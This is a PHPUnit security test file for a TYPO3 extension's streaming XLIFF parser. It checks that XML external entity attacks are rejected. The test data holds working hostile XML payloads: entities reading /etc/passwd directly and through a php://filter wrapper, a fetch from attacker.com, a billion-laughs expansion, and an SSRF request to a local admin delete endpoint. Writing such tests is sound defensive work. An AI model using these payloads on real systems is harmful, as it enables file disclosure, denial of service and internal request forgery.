<?php

declare(strict_types=1);

namespace Netresearch\NrXliffStreaming\Tests\Unit\Parser;

use Netresearch\NrXliffStreaming\Parser\XliffStreamingParser;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use TYPO3\TestingFramework\Core\Unit\UnitTestCase;

/**
 * XXE (XML External Entity) Attack Protection Tests
 *
 * Tests that the streaming parser is protected against XXE attacks:
 * - CWE-611: Improper Restriction of XML External Entity Reference
 * - CVSS 7.5-8.5 (HIGH severity)
 *
 * @author Netresearch DTT GmbH
 */
#[CoversClass(XliffStreamingParser::class)]
final class XliffStreamingParserXXETest extends UnitTestCase
{
    private XliffStreamingParser $subject;

    protected function setUp(): void
    {
        parent::setUp();
        $this->subject = new XliffStreamingParser();
    }

    #[Test]
    public function xxePayloadWithFileReadIsBlocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="xxe.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // LIBXML_NONET blocks external entities, causing parsing to fail
        // This is expected and secure behavior - fail-safe, not fail-open
        $this->expectException(\Netresearch\NrXliffStreaming\Exception\InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);
        $this->expectExceptionMessage('external entities are blocked');

        iterator_to_array($this->subject->parseTransUnits($xxePayload));
    }

    #[Test]
    public function xxePayloadWithNetworkAccessIsBlocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="network.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // LIBXML_NONET flag prevents network access, causing parsing to fail
        $this->expectException(\Netresearch\NrXliffStreaming\Exception\InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);

        iterator_to_array($this->subject->parseTransUnits($xxePayload));
    }

    #[Test]
    public function billionLaughsAttackIsMitigated(): void
    {
        $billionLaughs = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="dos.test">
                <source>&lol3;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // XMLReader detects entity reference loop and prevents expansion
        // This throws an exception during expand(), which is the secure behavior
        $this->expectException(\Netresearch\NrXliffStreaming\Exception\InvalidXliffException::class);
        $this->expectExceptionCode(1700000002);
        $this->expectExceptionMessage('entity reference loop');

        iterator_to_array($this->subject->parseTransUnits($billionLaughs));
    }

    #[Test]
    public function xxePayloadWithPhpWrapperIsBlocked(): void
    {
        $phpWrapper = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="php.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // PHP wrapper access is blocked by LIBXML_NONET
        $this->expectException(\Netresearch\NrXliffStreaming\Exception\InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);

        iterator_to_array($this->subject->parseTransUnits($phpWrapper));
    }

    #[Test]
    public function ssrfAttackViaXxeIsBlocked(): void
    {
        $ssrfPayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
    <!ENTITY xxe SYSTEM "http://localhost:8080/admin/delete-all">
]>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
    <file target-language="en" datatype="plaintext" original="messages">
        <body>
            <trans-unit id="ssrf.test">
                <source>&xxe;</source>
            </trans-unit>
        </body>
    </file>
</xliff>
XML;

        // SSRF via XXE is blocked by LIBXML_NONET, causing parsing to fail
        $this->expectException(\Netresearch\NrXliffStreaming\Exception\InvalidXliffException::class);
        $this->expectExceptionCode(1700000003);

        iterator_to_array($this->subject->parseTransUnits($ssrfPayload));
    }
}
